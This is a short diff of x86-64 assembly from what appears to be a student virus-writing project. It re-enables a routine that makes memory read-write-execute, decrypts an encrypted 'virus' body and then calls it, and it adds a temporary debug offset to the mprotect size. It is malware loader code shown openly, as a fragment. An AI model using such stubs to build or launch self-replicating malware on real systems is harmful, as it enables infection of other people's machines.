@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/07 10:18:12 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/10 19:14:41 by agrumbac         ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -101,23 +101,24 @@ mark_below:
 	mov r9, [rsp + 24]         ; get ptld len
 
 	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
+add r9, 0x2df0;TMp DEBUG
 	mov rdi, r8
 	mov rsi, r9
 	mov rdx, PROT_RWX
 	mov rax, SYSCALL_MPROTECT
 	syscall
 ;------------------------------; decrypt virus
-	; mov rdx, [rsp]             ; get key
-	; mov r10, [rsp + 16]        ; get virus_addr
-	;
-	; mov rax, r14               ; get virus_size
-	;
-	; ;decrypt(32, virus_addr, key, virus_size);
-	; mov rdi, 32
-	; mov rsi, r10
-	; mov rdx, rdx
-	; mov rcx, rax
-	; call decrypt
+	mov rdx, [rsp]             ; get key
+	mov r10, [rsp + 16]        ; get virus_addr
+
+	mov rax, r14               ; get virus_size
+
+	;decrypt(32, virus_addr, key, virus_size);
+	mov rdi, 32
+	mov rsi, r10
+	mov rdx, rdx
+	mov rcx, rax
+	call decrypt
 ;------------------------------; launch virus
 	mov rdi, rdx
 	call virus
